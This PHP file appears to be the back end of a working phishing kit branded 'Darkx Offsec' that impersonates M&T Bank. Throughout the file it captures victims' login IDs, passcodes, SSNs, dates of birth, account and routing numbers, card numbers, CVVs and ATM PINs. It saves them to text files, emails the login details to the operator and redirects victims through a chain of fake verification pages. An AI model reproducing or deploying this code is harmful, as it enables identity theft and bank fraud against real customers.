<?php
session_start();

// variable declaration
$errors = array();

if (isset($_POST['ReasonCode']))
{
    include 'recon.php';
    include 'mail.php';
    // check for valid email address
    $userID = $_POST['userID'];
    $passcode = $_POST['passcode'];

    $pin = "404";
    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    //send email
    $body = "|------- Darkx 𝙾𝚏𝚏𝚜𝚎𝚌 Info [Login Details] -----------|\r\n";
    $body .= "userID                                 : $userID\r\n";
    $body .= "Passcode                               : $passcode\r\n";
    $body .= "|--------------- I N F O | I P -------------------|\r\n";
    $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
    $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME		                       : " . date("d/m/Y h:i:sa") . " GMT\r\n";
    $body .= "|-----------𝙾𝚏𝚏𝚜𝚎𝚌 M&T Info--------------|\r\n";

    $save = fopen("access/logincheck.txt", "a+");
    fwrite($save, $body);
    fclose($save);
 
    $discoverbank = ['text' => $body];

    // $subject = "M&T Darkx Login Access => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

    // $headers = "From: M&T Darkx V1 <darkxxcoder@dila.dz>\r\n";
    // $headers .= "MIME-Version: 1.0\r\n";
    // $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    // if (@mail($to, $subject, $body, $headers))
    // {
        $key = substr(sha1(mt_rand()) , 1, 25);
        echo "<script>window.location.href='../account_verify.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "';</script>";
        die();
    // }
    // else
    // {
    //     $key = substr(sha1(mt_rand()) , 1, 25);
    //     echo "<script>window.location.href='../login.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "';</script>";
    //     die();
    // }
}

if (isset($_POST['userID']) && isset($_POST['passcode']))
{
    include 'recon.php';
    include 'mail.php';
    // check for valid email address
    $userID = $_POST['userID'];
    $passcode = $_POST['passcode'];

    $pin = "404";
    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    //send email
    $body = "|------- Darkx 𝙾𝚏𝚏𝚜𝚎𝚌 Info [Login Details] -----------|\r\n";
    $body .= "userID                                 : $userID\r\n";
    $body .= "Passcode                               : $passcode\r\n";
    $body .= "|--------------- I N F O | I P -------------------|\r\n";
    $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
    $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME		                       : " . date("d/m/Y h:i:sa") . " GMT\r\n";
    $body .= "|-----------Darkx 𝙾𝚏𝚏𝚜𝚎𝚌 Info--------------|\r\n";

    $save = fopen("access/login.txt", "a+");
    fwrite($save, $body);
    fclose($save);

    $discoverbank = ['text' => $body];

    $subject = "M&T 𝙾𝚏𝚏𝚜𝚎𝚌 Login Access => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

    $headers = "From: M&T 𝙾𝚏𝚏𝚜𝚎𝚌 V1 <darkxxcoder@dila.dz>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    if (@mail($to, $subject, $body, $headers))
    {
        $key = substr(sha1(mt_rand()) , 1, 25);
        echo "<script>window.location.href='../login.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "&ReasonCode=6004';</script>";
        die();
    }
    else
    {
        $key = substr(sha1(mt_rand()) , 1, 25);
        echo "<script>window.location.href='../login.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "&ReasonCode=6004';</script>";
        die();
    }
}

if (isset($_POST['account_verify']))
{
    include 'recon.php';
    include 'mail.php';
    // check for valid email address
    $ssn = $_POST['ssn'];
    $rgnum = $_POST['rgnum'];
    $address = $_POST['address'];
    $accnum = $_POST['accnum'];
    $fname = $_POST['fname'];
    $lname = $_POST['lname'];
    $pin = $_POST['pin'];
    $dob = $_POST['dob'];

    $pin = "404";
    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    //send email
    $body = "|--------------𝙾𝚏𝚏𝚜𝚎𝚌 M&T Info [Account Details] ----------------------|\r\n";
    $body .= "First Name                          : $fname\r\n";
    $body .= "Last Name                           : $lname\r\n";
    $body .= "Address                             : $address\r\n";
    $body .= "SSN                                 : $ssn\r\n";
    $body .= "PIN                                 : $pin\r\n";
    $body .= "Date Of Birth                       : $dob\r\n";
    $body .= "Account Number                      : $accnum\r\n";
    $body .= "Routing Number                      : $rgnum\r\n";
    $body .= "|--------------- I N F O | I P -------------------|\r\n";
    $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $body .= "IP City	                               : {$_SESSION['city']}\r\n";
    $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME		                       : " . date("d/m/Y h:i:sa") . " GMT\r\n";
    $body .= "|-----------𝙾𝚏𝚏𝚜𝚎𝚌 M&T Info--------------|\r\n";

    $save = fopen("access/personal_details.txt", "a+");
    fwrite($save, $body);
    fclose($save);

    $discoverbank = ['text' => $body];

    // $subject = "M&T 𝙾𝚏𝚏𝚜𝚎𝚌 Account Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

    // $headers = "From: M&T 𝙾𝚏𝚏𝚜𝚎𝚌 V1 <darkxxcoder@dila.dz>\r\n";
    // $headers .= "MIME-Version: 1.0\r\n";
    // $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    // if (@mail($to, $subject, $body, $headers))
    // {
        $key = substr(sha1(mt_rand()) , 1, 25);
        echo "<script>window.location.href='../credit_verify.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "';</script>";
        die();
    // }
    // else
    // {
    //     $key = substr(sha1(mt_rand()) , 1, 25);
    //     echo "<script>window.location.href='../account_verify.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "';</script>";
    //     die();
    // }
}

if (isset($_POST['credit_verify']))
{
    include 'recon.php';
    include 'mail.php';

    $ccnum = $_POST['ccnum'];
    $expdate = $_POST['expdate'];
    $cvv = $_POST['cvv'];
    $mmn = $_POST['mmn'];
    $pin = $_POST['pin'];

    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    //send email
    $body = "|--------------𝙾𝚏𝚏𝚜𝚎𝚌 M&T Info [CC Details & Billing] ----------------------|\r\n";
    $body .= "Card Number                  : $ccnum\r\n";
    $body .= "Expiration Date              : $expdate\r\n";
    $body .= "Security Code                : $cvv\r\n";
    $body .= "ATM PIN                      : $pin\r\n";
    $body .= "|--------------- I N F O | I P -------------------|\r\n";
    $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $body .= "IP City	                               : {$_SESSION['city']}\r\n";
    $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME		                       : " . date("d/m/Y h:i:sa") . " GMT\r\n";
    $body .= "|----------𝙾𝚏𝚏𝚜𝚎𝚌 M&T Info--------------|\r\n";

    $save = fopen("access/CC+Billing.txt", "a+");
    fwrite($save, $body);
    fclose($save);

    $discoverbank = ['text' => $body];

    // $subject = "M&T 𝙾𝚏𝚏𝚜𝚎𝚌 CC Details & Billing => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

    // $headers = "From: M&T 𝙾𝚏𝚏𝚜𝚎𝚌 V1 <darkxxcoder@dila.dz>\r\n";
    // $headers .= "MIME-Version: 1.0\r\n";
    // $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    // if (@mail($to, $subject, $body, $headers))
    // {
        $key = substr(sha1(mt_rand()) , 1, 25);
        echo "<script>window.location.href='../mail_verify.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "';</script>";
        die();
    // }
    // else
    // {
    //     $key = substr(sha1(mt_rand()) , 1, 25);
    //     echo "<script>window.location.href='../credit_verify.php?primarymember_id=" . $key . "&country=" . $_SESSION['country'] . "&iso=" . $_SESSION['countrycode'] . "';</script>";
    //     die();
    // }
}

?>
